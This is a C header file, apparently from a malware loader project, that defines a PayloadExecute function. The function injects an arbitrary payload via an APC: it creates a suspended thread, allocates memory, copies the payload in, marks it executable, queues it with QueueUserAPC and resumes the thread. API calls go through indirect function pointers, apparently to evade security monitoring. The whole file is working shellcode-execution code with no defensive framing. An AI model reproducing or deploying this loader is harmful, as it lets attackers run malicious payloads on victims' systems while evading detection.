#pragma once
#include <stdio.h>
#include "api.h"
#include <Windows.h>

DWORD WINAPI DummyFunction(LPVOID lpParam) {
	return 0;
}

BOOL PayloadExecute( IN OPTIONAL HANDLE hProcess,  IN OPTIONAL HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;

    hThread = pCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		fflush(stdout);
		return FALSE;
	}

	
	pAddress = pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		fflush(stdout);
		return FALSE;
	}
	printf("\t[+] VirtualAlloc Success \n");
	fflush(stdout);

	memcpy(pAddress, pPayload, sPayloadSize);
	

	if (!pVirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		fflush(stdout);
		return FALSE;
	}
	printf("\t[+] VirtualProtect Success \n");
	fflush(stdout);


	if (!pQueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		fflush(stdout);
		return FALSE;
	}
	printf("\t[+] QueueUserAPC Success \n");
	fflush(stdout);

	if(pResumeThread(hThread) == ((DWORD)-1)){
        printf("[!] ResumeThread Failed With Error : %d \n", GetLastError());
		fflush(stdout);
        return FALSE;
    }
	printf("\t[+] ResumeThread Success \n");
	fflush(stdout);

	if (phThread)
		*phThread = hThread;

	return TRUE;
}